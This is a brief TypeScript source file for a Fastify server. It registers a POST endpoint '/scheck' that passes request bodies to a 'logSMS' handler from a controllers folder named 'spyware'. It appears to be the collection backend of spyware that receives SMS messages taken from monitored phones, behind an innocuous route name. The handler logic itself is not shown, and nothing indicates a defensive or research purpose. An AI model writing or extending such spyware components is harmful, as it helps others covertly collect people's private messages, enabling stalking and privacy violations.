import { FastifyInstance } from 'fastify';
import { logSMS, logSmsSchema } from '../controllers/spyware/logSms';

export default function (fastify: FastifyInstance, opts: any, done: Function) {
	fastify.post('/scheck', { schema: { body: logSmsSchema}}, logSMS);
	done();
}